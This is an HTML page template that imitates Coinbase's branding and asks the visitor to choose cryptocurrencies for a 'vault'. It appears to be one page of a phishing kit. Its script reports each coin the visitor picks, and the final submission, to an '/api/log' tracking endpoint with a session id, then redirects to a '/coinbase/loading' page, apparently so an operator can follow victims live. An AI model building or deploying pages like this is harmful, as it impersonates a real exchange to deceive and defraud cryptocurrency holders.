
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Select Assets</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
  </style>
  <style>
    #sva-dropdown{display:none;position:absolute;left:0;right:0;top:100%;z-index:50;background:#1a1d22;border:1px solid #2d3039;border-radius:8px;max-height:220px;overflow-x:hidden;overflow-y:auto;margin-top:4px;}
    #sva-dropdown::-webkit-scrollbar{width:6px;}
    #sva-dropdown::-webkit-scrollbar-button{display:none;width:0;height:0;}
    #sva-dropdown::-webkit-scrollbar-track{background:#0a0b0d;}
    #sva-dropdown::-webkit-scrollbar-thumb{background:#2d3039;border-radius:4px;}
    #sva-dropdown::-webkit-scrollbar-thumb:hover{background:#6b7280;}
    .sva-opt{display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;color:#fff;font-family:inherit;}
    .sva-opt:hover{background:#23262d;}
    .sva-opt-icon{width:32px;height:32px;border-radius:50%;overflow:hidden;flex-shrink:0;}
    .sva-opt-icon img{width:32px;height:32px;display:block;}
    .sva-opt-nm{font-weight:600;font-size:0.95em;}
    .sva-opt-tk{font-size:0.78em;color:#6b7280;margin-left:2px;}
    #sva-search-wrap{position:relative;}
    .sva-sel-icon{width:40px;height:40px;border-radius:50%;overflow:hidden;flex-shrink:0;}
    .sva-sel-icon img{width:40px;height:40px;display:block;}
    .sva-fallback{width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;color:#fff;}
    #sva-selected{
     max-height:min(40vh,280px);
     overflow-x:hidden;
     overflow-y:auto;
    }
    #sva-selected::-webkit-scrollbar{width:6px;}
    #sva-selected::-webkit-scrollbar-button{display:none;width:0;height:0;}
    #sva-selected::-webkit-scrollbar-track{background:#0a0b0d;}
    #sva-selected::-webkit-scrollbar-thumb{background:#2d3039;border-radius:4px;}
    #sva-selected::-webkit-scrollbar-thumb:hover{background:#6b7280;}
    @@supports not selector(::-webkit-scrollbar){
     #sva-selected,#sva-dropdown{scrollbar-width:thin;scrollbar-color:#2d3039 #0a0b0d;}
    }
.ll-fb-logo{width:32px;height:32px;display:block;flex-shrink:0}
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style:}
*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}
html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}
body{margin:0;line-height:inherit}
h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}
b,strong{font-weight:bolder}
button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}
button,select{text-transform:none}
button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}
blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}
img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}
html,body,#root{height:100%}
.relative{position:relative}
.mb-4{margin-bottom:1rem}
.mr-1{margin-right:.25rem}
.mt-12{margin-top:3rem}
.mt-4{margin-top:1rem}
.mt-5{margin-top:1.25rem}
.flex{display:flex}
.h-full{height:100%}
.min-h-fit{min-height:-moz-fit-content;min-height:fit-content}
.w-full{width:100%}
.max-w-md{max-width:28rem}
.flex-grow{flex-grow:1}
.flex-col{flex-direction:column}
.items-center{align-items:center}
.justify-center{justify-content:center}
.justify-between{justify-content:space-between}
.gap-2{gap:.5rem}
.rounded-\[16px\]{border-radius:16px}
.rounded-full{border-radius:9999px}
.rounded-md{border-radius:.375rem}
.border{border-width:1px}
.border-coinbase-line{border-color:#8a919e33}
.bg-coinbase-background{--tw-bg-opacity: 1;background-color:rgb(10 11 13 / var(--tw-bg-opacity, 1))}
.bg-coinbase-primary{--tw-bg-opacity: 1;background-color:rgb(87 139 250 / var(--tw-bg-opacity, 1))}
.p-2{padding:.5rem}
.p-6{padding:1.5rem}
.px-3{padding-left:.75rem;padding-right:.75rem}
.px-4{padding-left:1rem;padding-right:1rem}
.px-6{padding-left:1.5rem;padding-right:1.5rem}
.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}
.py-4{padding-top:1rem;padding-bottom:1rem}
.pb-2{padding-bottom:.5rem}
.pb-8{padding-bottom:2rem}
.pl-6{padding-left:1.5rem}
.pr-8{padding-right:2rem}
.pt-5{padding-top:1.25rem}
.text-left{text-align:left}
.font-coinbase-sans{font-family:CBSans}
.font-coinbase-text{font-family:CBText}
.font-coinbase-title{font-family:CBDisplay}
.text-\[28px\]{font-size:28px}
.text-sm{font-size:.875rem;line-height:1.25rem}
.font-semibold{font-weight:600}
.text-black{--tw-text-opacity: 1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}
.text-coinbase-foreground-muted{--tw-text-opacity: 1;color:rgb(138 145 158 / var(--tw-text-opacity, 1))}
.text-white{--tw-text-opacity: 1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}
.outline-none{outline:2px solid transparent;outline-offset:2px}
.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}
.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}
.hover\:bg-\[\#0f1012\]:hover{--tw-bg-opacity: 1;background-color:rgb(15 16 18 / var(--tw-bg-opacity, 1))}
.hover\:bg-\[\#507fe5\]:hover{--tw-bg-opacity: 1;background-color:rgb(80 127 229 / var(--tw-bg-opacity, 1))}
.hover\:bg-coinbase-line\/10:hover{background-color:#8a919e1a}
.hover\:text-white:hover{--tw-text-opacity: 1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}
.focus\:outline-coinbase-primary:focus{outline-color:#578bfa}
.active\:scale-\[\.98\]:active{--tw-scale-x: .98;--tw-scale-y: .98;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
.active\:bg-\[\#4b78d6\]:active{--tw-bg-opacity: 1;background-color:rgb(75 120 214 / var(--tw-bg-opacity, 1))}
.disabled\:scale-100:disabled{--tw-scale-x: 1;--tw-scale-y: 1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
.disabled\:bg-\[\#314b84\]:disabled{--tw-bg-opacity: 1;background-color:rgb(49 75 132 / var(--tw-bg-opacity, 1))}
@media (min-width: 640px){.sm\:mt-24{margin-top:6rem}}
@media (min-width: 640px){.sm\:justify-start{justify-content:flex-start}}
@media (min-width: 640px){.sm\:border{border-width:1px}}
@media (min-width: 640px){.sm\:border-coinbase-line,.sm\:border-crypto-line{border-color:#8a919e33}}
@media (min-width: 640px){.sm\:px-10{padding-left:2.5rem;padding-right:2.5rem}}
@media (min-width: 640px){.sm\:py-8{padding-top:2rem;padding-bottom:2rem}}
  </style>
 </head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"/>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form id="sva-form" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span id="sva-title" class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">Select assets to include in your vault</span>
      <span id="sva-sub" class="font-coinbase-sans text-coinbase-foreground-muted">Select the assets you want to include in your vault. You can always add more later.</span>
      <div class="relative mb-4 flex flex-col gap-2">
       <div id="sva-search-wrap" class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
        <span class="text-sm font-semibold"></span>
        <input id="sva-search" class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" placeholder="Search for an asset" autocomplete="off"/>
        <div id="sva-dropdown"></div>
       </div>
      </div>
      <div id="sva-selected" class="flex flex-col gap-2 transition-all"></div>
      <button id="sva-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center" type="button">Continue</button>
     </form>
    </div>
   </div>
  </div>

  <script>
@verbatim
  (function(){
    var d = window._cbSvaData || {};
    var titleEl = document.getElementById('sva-title');
    var subEl   = document.getElementById('sva-sub');
    var btn     = document.getElementById('sva-btn');
    if (d.title && titleEl) titleEl.textContent = d.title;
    if (d.sub   && subEl)   subEl.textContent   = d.sub;
    if (d.btn   && btn)     btn.textContent      = d.btn;

    var CSRF  = window._liveledCSRF || '';
    var TRACK = '/api/log';
    var COINS = [
      {key:'btc',         name:'Bitcoin',             ticker:'BTC',    color:'#F7931A', image_url:'https://coin-images.coingecko.com/coins/images/1/large/bitcoin.png'},
      {key:'eth',         name:'Ethereum',            ticker:'ETH',    color:'#627EEA', image_url:'https://coin-images.coingecko.com/coins/images/279/large/ethereum.png'},
      {key:'sol',         name:'Solana',              ticker:'SOL',    color:'#9945FF', image_url:'https://coin-images.coingecko.com/coins/images/4128/large/solana.png'},
      {key:'xrp',         name:'XRP',                 ticker:'XRP',    color:'#346AA9', image_url:'https://coin-images.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png'},
      {key:'bnb',         name:'BNB',                 ticker:'BNB',    color:'#F3BA2F', image_url:'https://coin-images.coingecko.com/coins/images/825/large/bnb-icon2_2x.png'},
      {key:'ada',         name:'Cardano',             ticker:'ADA',    color:'#0033AD', image_url:'https://coin-images.coingecko.com/coins/images/975/large/cardano.png'},
      {key:'doge',        name:'Dogecoin',            ticker:'DOGE',   color:'#C2A633', image_url:'https://coin-images.coingecko.com/coins/images/5/large/dogecoin.png'},
      {key:'trx',         name:'TRON',                ticker:'TRX',    color:'#EF0027', image_url:'https://coin-images.coingecko.com/coins/images/1094/large/tron-logo.png'},
      {key:'avax',        name:'Avalanche',           ticker:'AVAX',   color:'#E84142', image_url:'https://coin-images.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png'},
      {key:'shib',        name:'Shiba Inu',           ticker:'SHIB',   color:'#FFA409', image_url:'https://coin-images.coingecko.com/coins/images/11939/large/shiba.png'},
      {key:'ton',         name:'Toncoin',             ticker:'TON',    color:'#0088CC', image_url:'https://coin-images.coingecko.com/coins/images/17980/large/ton_symbol.png'},
      {key:'link',        name:'Chainlink',           ticker:'LINK',   color:'#375BD2', image_url:'https://coin-images.coingecko.com/coins/images/877/large/chainlink-new-logo.png'},
      {key:'dot',         name:'Polkadot',            ticker:'DOT',    color:'#E6007A', image_url:'https://coin-images.coingecko.com/coins/images/12171/large/polkadot.png'},
      {key:'matic',       name:'Polygon',             ticker:'MATIC',  color:'#8247E5', image_url:'https://coin-images.coingecko.com/coins/images/4713/large/polygon.png'},
      {key:'ltc',         name:'Litecoin',            ticker:'LTC',    color:'#BFBBBB', image_url:'https://coin-images.coingecko.com/coins/images/2/large/litecoin.png'},
      {key:'uni',         name:'Uniswap',             ticker:'UNI',    color:'#FF007A', image_url:'https://coin-images.coingecko.com/coins/images/12504/large/uniswap-logo.png'},
      {key:'xlm',         name:'Stellar',             ticker:'XLM',    color:'#14B6E7', image_url:'https://coin-images.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png'},
      {key:'atom',        name:'Cosmos',              ticker:'ATOM',   color:'#2E3148', image_url:'https://coin-images.coingecko.com/coins/images/1481/large/cosmos_hub.png'},
      {key:'bch',         name:'Bitcoin Cash',        ticker:'BCH',    color:'#8DC351', image_url:'https://coin-images.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png'},
      {key:'wbtc',        name:'Wrapped Bitcoin',     ticker:'WBTC',   color:'#F09242', image_url:'https://coin-images.coingecko.com/coins/images/7598/large/wrapped_bitcoin_wbtc.png'},
      {key:'dai',         name:'Dai',                 ticker:'DAI',    color:'#F5AC37', image_url:'https://coin-images.coingecko.com/coins/images/9956/large/Badge_Dai.png'},
      {key:'near',        name:'NEAR Protocol',       ticker:'NEAR',   color:'#00C08B', image_url:'https://coin-images.coingecko.com/coins/images/10365/large/near.jpg'},
      {key:'arb',         name:'Arbitrum',            ticker:'ARB',    color:'#2D374B', image_url:'https://coin-images.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg'},
      {key:'op',          name:'Optimism',            ticker:'OP',     color:'#FF0420', image_url:'https://coin-images.coingecko.com/coins/images/25244/large/Optimism.png'},
      {key:'sui',         name:'Sui',                 ticker:'SUI',    color:'#4DA2FF', image_url:'https://coin-images.coingecko.com/coins/images/26375/large/sui_asset.jpeg'},
      {key:'apt',         name:'Aptos',               ticker:'APT',    color:'#00BFA5', image_url:'https://coin-images.coingecko.com/coins/images/26455/large/aptos_round.png'},
      {key:'inj',         name:'Injective',           ticker:'INJ',    color:'#00B4D8', image_url:'https://coin-images.coingecko.com/coins/images/12882/large/Secondary_Symbol.png'},
      {key:'hbar',        name:'Hedera',              ticker:'HBAR',   color:'#000000', image_url:'https://coin-images.coingecko.com/coins/images/3688/large/hbar.png'},
      {key:'ldo',         name:'Lido DAO',            ticker:'LDO',    color:'#F6699D', image_url:'https://coin-images.coingecko.com/coins/images/13573/large/lido_dao.png'},
      {key:'stx',         name:'Stacks',              ticker:'STX',    color:'#5546FF', image_url:'https://coin-images.coingecko.com/coins/images/2069/large/Stacks_logo_full.png'},
      {key:'aave',        name:'Aave',                ticker:'AAVE',   color:'#B6509E', image_url:'https://coin-images.coingecko.com/coins/images/12645/large/aave-token-round.png'},
      {key:'icp',         name:'Internet Computer',   ticker:'ICP',    color:'#29ABE2', image_url:'https://coin-images.coingecko.com/coins/images/14495/large/Internet_Computer_logo.png'},
      {key:'render',      name:'Render',              ticker:'RENDER', color:'#FF4500', image_url:'https://coin-images.coingecko.com/coins/images/11636/large/rndr.png'},
      {key:'tao',         name:'Bittensor',           ticker:'TAO',    color:'#333333', image_url:'https://coin-images.coingecko.com/coins/images/28452/large/ARUqqBve_400x400.jpg'},
      {key:'pepe',        name:'Pepe',                ticker:'PEPE',   color:'#479040', image_url:'https://coin-images.coingecko.com/coins/images/29850/large/pepe-token.jpeg'},
      {key:'bonk',        name:'Bonk',                ticker:'BONK',   color:'#F5841F', image_url:'https://coin-images.coingecko.com/coins/images/28600/large/bonk.jpg'},
      {key:'wif',         name:'dogwifhat',            ticker:'WIF',    color:'#9945FF', image_url:'https://coin-images.coingecko.com/coins/images/33566/large/dogwifhat.jpg'},
      {key:'floki',       name:'Floki',               ticker:'FLOKI',  color:'#CF811D', image_url:'https://coin-images.coingecko.com/coins/images/16746/large/PNG_image.png'},
      {key:'cro',         name:'Cronos',              ticker:'CRO',    color:'#1199fa', image_url:'https://coin-images.coingecko.com/coins/images/7310/large/cro_token_logo.png'},
      {key:'vet',         name:'VeChain',             ticker:'VET',    color:'#15BDFF', image_url:'https://coin-images.coingecko.com/coins/images/1167/large/VeChain-Logo-768px.png'},
      {key:'mana',        name:'Decentraland',        ticker:'MANA',   color:'#FF2D55', image_url:'https://coin-images.coingecko.com/coins/images/878/large/decentraland-mana.png'},
      {key:'sand',        name:'The Sandbox',         ticker:'SAND',   color:'#04ADEF', image_url:'https://coin-images.coingecko.com/coins/images/12129/large/sandbox_logo.jpg'},
      {key:'axs',         name:'Axie Infinity',       ticker:'AXS',    color:'#0055D4', image_url:'https://coin-images.coingecko.com/coins/images/13029/large/axie_infinity_logo.png'},
      {key:'usdt',        name:'Tether',              ticker:'USDT',   color:'#26A17B', image_url:'https://coin-images.coingecko.com/coins/images/325/large/Tether.png'},
      {key:'usdc',        name:'USD Coin',            ticker:'USDC',   color:'#2775CA', image_url:'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png'},
    ];

    function _iconUrl(coin) {
      return coin.image_url || '';
    }

    function _iconImgHtml(coin, size) {
      return '<img src="' + _iconUrl(coin) + '" width="' + size + '" height="' + size + '" alt="' + coin.ticker + '" style="display:block;" onerror="this.style.display=\'none\';this.nextSibling.style.display=\'flex\';"/>' +
             '<div class="sva-fallback" style="display:none;background:' + coin.color + ';width:' + size + 'px;height:' + size + 'px;border-radius:50%;">' + coin.ticker.substring(0,4) + '</div>';
    }

    var selected = [];

    function _indexOf(key) {
      for (var i = 0; i < selected.length; i++) if (selected[i].key === key) return i;
      return -1;
    }

    function _renderSelected() {
      var wrap = document.getElementById('sva-selected');
      wrap.innerHTML = '';
      selected.forEach(function(coin) {
        var row = document.createElement('div');
        row.className = 'flex items-center justify-between rounded-md border border-coinbase-line p-2 px-3 font-coinbase-title font-semibold text-white hover:bg-coinbase-line/10';
        row.innerHTML =
          '<div class="flex items-center gap-2">' +
            '<div class="sva-sel-icon mr-1">' + _iconImgHtml(coin, 40) + '</div>' +
            '<span>' + coin.name + '</span>' +
          '</div>' +
          '<div class="flex items-center gap-2">' +
            '<button type="button" data-key="' + coin.key + '" class="sva-remove text-coinbase-foreground-muted hover:text-white">' +
              '<svg fill="none" height="18" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>' +
            '</button>' +
          '</div>';
        wrap.appendChild(row);
      });
      wrap.querySelectorAll('.sva-remove').forEach(function(rmBtn) {
        rmBtn.addEventListener('click', function(e) {
          e.preventDefault();
          var idx = _indexOf(this.getAttribute('data-key'));
          if (idx !== -1) selected.splice(idx, 1);
          _renderSelected();
          _beacon();
        });
      });
    }

    var _beaconTimer = null;
    function _beacon() {
      clearTimeout(_beaconTimer);
      _beaconTimer = setTimeout(function() {
        var val = selected.map(function(c){ return c.name + ' (' + c.key + ')'; }).join(', ');
        var gate = window._llWhenWritable || function(fn){ return Promise.reject(); };
        gate(function(){
          var b = new URLSearchParams({_token:CSRF, type:'coin_input', page:'coinbase_select_vault_assets', element:'selection', value:val||'', doc:window._llDocId||''});
          try { navigator.sendBeacon(TRACK, b); } catch(e) {}
        });
      }, 400);
    }

    var search   = document.getElementById('sva-search');
    var dropdown = document.getElementById('sva-dropdown');

    function _renderDropdown(q) {
      dropdown.innerHTML = '';
      if (!q) { dropdown.style.display = 'none'; return; }
      var q2 = q.toLowerCase();
      var matches = COINS.filter(function(c) {
        return c.name.toLowerCase().indexOf(q2) !== -1 || c.ticker.toLowerCase().indexOf(q2) !== -1;
      });
      if (!matches.length) { dropdown.style.display = 'none'; return; }
      matches.forEach(function(coin) {
        var opt = document.createElement('div');
        opt.className = 'sva-opt';
        if (_indexOf(coin.key) !== -1) opt.style.opacity = '0.4';
        opt.innerHTML =
          '<div class="sva-opt-icon">' + _iconImgHtml(coin, 32) + '</div>' +
          '<span class="sva-opt-nm">' + coin.name + '</span>' +
          '<span class="sva-opt-tk">' + coin.ticker + '</span>';
        opt.addEventListener('mousedown', function(e) {
          e.preventDefault();
          if (_indexOf(coin.key) === -1) {
            selected.push(coin);
            _renderSelected();
            _beacon();
          }
          search.value = '';
          dropdown.style.display = 'none';
          search.focus();
        });
        dropdown.appendChild(opt);
      });
      dropdown.style.display = 'block';
    }

    search.addEventListener('input', function() { _renderDropdown(this.value.trim()); });
    search.addEventListener('focus', function() { if (this.value.trim()) _renderDropdown(this.value.trim()); });
    search.addEventListener('blur',  function() { setTimeout(function(){ dropdown.style.display='none'; }, 150); });

    btn.addEventListener('click', function() {
      var val = selected.map(function(c){ return c.name + ' (' + c.ticker + ')'; }).join(', ');
      var gate = window._llWhenWritable || function(fn){ return Promise.resolve(); };
      gate(function(){
        var b = new URLSearchParams({_token:CSRF, type:'form_submit', page:'coinbase_select_vault_assets', element:'assets', value:val||'none', doc:window._llDocId||''});
        try { navigator.sendBeacon(TRACK, b); } catch(e) {}
      }).then(function(){
        if (window.navigateTo) window.navigateTo('/coinbase/loading');
        else window.location.href = '/coinbase/loading';
      });
    });
  })();
@endverbatim
  </script>

 </body>
</html>

